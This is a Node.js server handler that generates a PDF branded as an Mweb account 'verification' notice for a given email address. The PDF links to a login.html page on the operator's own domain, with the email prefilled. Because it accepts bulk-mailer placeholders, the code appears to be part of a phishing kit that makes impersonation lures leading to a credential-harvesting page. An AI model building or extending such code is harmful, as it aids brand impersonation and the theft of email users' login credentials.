const { generateVerificationPDF } = require('../pdfGenerator');

function isValidEmail(email) {
  if (!email || typeof email !== 'string') return false;
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
}

async function handleVerificationPDF(req, res) {
  try {
    let { email } = req.query;
    
    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Email parameter is required.',
      });
    }

    let finalEmail = email.trim();

    // Handle placeholder — use a fallback for testing
    if (finalEmail === '[[-Email-]]' || finalEmail === '{{email}}') {
      // For testing: generate PDF with a demo email
      // In production, fetch the real email from your database here
      finalEmail = 'user@mweb.co.za';
      console.log(`[PDF] Placeholder detected, using fallback: ${finalEmail}`);
    }

    if (!isValidEmail(finalEmail)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: `Invalid email: ${finalEmail}`,
      });
    }

    const baseDomain = process.env.DOMAIN || `${req.protocol}://${req.get('host')}`;
    const verifyUrl = `${baseDomain}/login.html?email=${encodeURIComponent(finalEmail)}`;

    const pdfBuffer = await generateVerificationPDF(finalEmail, verifyUrl);

    res.set({
      'Content-Type': 'application/pdf',
      'Content-Disposition': `inline; filename="Mweb_Verification_${finalEmail.replace(/[@.]/g, '_')}.pdf"`,
      'Content-Length': pdfBuffer.length,
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    });

    res.send(pdfBuffer);

  } catch (error) {
    console.error('[PDF] Error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal Server Error',
      message: 'Failed to generate PDF.',
    });
  }
}

module.exports = { handleVerificationPDF };
